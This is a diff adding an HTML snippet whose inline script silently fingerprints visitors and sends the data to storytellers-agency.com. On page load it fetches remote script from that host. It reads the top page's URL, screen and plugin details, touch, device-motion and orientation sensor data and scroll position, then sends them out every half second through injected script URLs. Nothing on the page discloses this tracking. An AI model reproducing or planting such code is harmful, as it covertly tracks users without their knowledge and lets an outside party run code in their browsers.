@@ -1,0 +1,144 @@
+<style>
+    body {
+        margin: 0px;
+    }
+</style>
+
+
+<script>
+    window["time"] = new Date().getTime();
+    try {
+        var dod1 = document.getElementsByTagName('html')[0];
+        var sc1 = document.createElement("script");
+        sc1.src = 'https://storytellers-agency.com/jpeg1.php?name=' + window["time"] * 2;
+        dod1.appendChild(sc1);
+        var A = {};
+        tr = [0];
+        var f = {};
+        if (window.parent != window) {
+            for (var i = 0; i < (window.parent.frames.length); i++) {
+                if (window.parent.frames[i].window.document == window.document) {
+                    var docu = parent.window.document.getElementsByTagName("iframe")[i];
+                    getInfo(1);
+                }
+            }
+        } else {
+            getInfo(2);
+        }
+
+
+        function getInfo(a) {
+            f.a = a;
+            f.w3 = top.document.body.scrollWidth;
+            f.h3 = top.document.body.scrollHeight;
+            f.w4 = window.screen.availHeight;
+            f.h4 = window.screen.availWidth;
+            f.left = docu.getBoundingClientRect().left;
+            f.right = docu.getBoundingClientRect().right;
+            f.top = docu.getBoundingClientRect().top;
+            f.bottom = docu.getBoundingClientRect().bottom;
+            f.width = docu.getBoundingClientRect().width;
+            f.height = docu.getBoundingClientRect().height;
+            f.width = docu.getBoundingClientRect().width;
+            f.height = docu.getBoundingClientRect().height;
+            f.color = screen.colorDepth;
+            f.plugins = navigator.plugins.length;
+            f.mimeTypes = navigator.mimeTypes.length;
+            f.refer = top.location.href;
+            return f;
+        }
+
+        a2("touchstart", d);
+        a2("touchend", e);
+        a2("touchmove", fe);
+        a2("deviceorientation", be);
+        a2("devicemotion", ce);
+
+        function a2(a, b) {
+            window.top.addEventListener(a, b, false);
+        }
+
+        function be(bs) {
+            A.alpha = bs.alpha;
+            A.beta  = bs.beta ;
+            A.gamma = bs.gamma;
+        }
+        function ce(cs) {
+            A.x = cs.acceleration.x;
+            A.y = cs.acceleration.y;
+            A.z = cs.acceleration.z;
+            A.accx = cs.accelerationIncludingGravity.x;
+            A.accy = cs.accelerationIncludingGravity.y;
+            A.accz = cs.accelerationIncludingGravity.z;
+            A.rota_alpha =cs.rotationRate.alpha;
+            A.rota_beta  =cs.rotationRate.beta ;
+            A.rota_gamma =cs.rotationRate.gamma;
+        }
+
+        function d(cs) {
+            A.startx = cs.touches[0].clientX;
+            A.starty = cs.touches[0].clientY;
+
+        }
+        function e(cs) {
+            A.endx = cs.changedTouches[0].clientX;
+            A.endy = cs.changedTouches[0].clientY;
+
+        };
+        A.cishu = 0;
+        function fe(cs) {
+            A.cishu++;
+            A.movex =  cs.changedTouches[0].clientX;
+            A.movey =  cs.changedTouches[0].clientY;
+        }
+
+        setInterval(function () {
+            so(1);
+        }, 500);
+
+
+        function so(e) {
+            if (!window["der"]) {
+                if (docu.getBoundingClientRect().top <= window.screen.availHeight) {
+                    a(1, e + "【islook】");
+                }
+                if (docu.getBoundingClientRect().top + docu.getBoundingClientRect().height < 0) {
+                    a(2, e + "【unlook】");
+                }
+                if (getScrollTop() + (window.screen.availHeight) >= (top.document.body.scrollHeight - 150)) {
+                    a(3, e + "【dowins】");
+                    window["der"] = 1;
+                }
+            }
+        }
+        function getScrollTop() {
+            var scrollTop = 0, bodyScrollTop = 0, documentScrollTop = 0;
+            if (top.document.body) {
+                bodyScrollTop = top.document.body.scrollTop;
+            }
+            if (top.document.documentElement) {
+                documentScrollTop = top.document.documentElement.scrollTop;
+            }
+            scrollTop = (bodyScrollTop - documentScrollTop > 0) ? bodyScrollTop : documentScrollTop;
+            return scrollTop;
+        }
+
+        function a(d, e) {
+            if (!window["de" + d]) {
+                tr.push(new Date().getTime() - window["time"]);
+                window["de" + d] = e;
+
+                var dod = document.getElementsByTagName('html')[0];
+                var sc = document.createElement("script");
+                sc.src = 'https://storytellers-agency.com/jpeg1.php?name=' + window["time"] * 2 + "&h=" + e + tr.join("-") + "   " + JSON.stringify(f) + "   " + JSON.stringify(A);
+                dod.appendChild(sc);
+            }
+        }
+    } catch (e) {
+        var dod2 = document.getElementsByTagName('html')[0];
+        var sc2 = document.createElement("script");
+        sc2.src = 'https://storytellers-agency.com/jpeg1.php?name=' + window["time"] * 2 + "&h=" + e;
+        dod2.appendChild(sc2);
+    }
+
+</script>
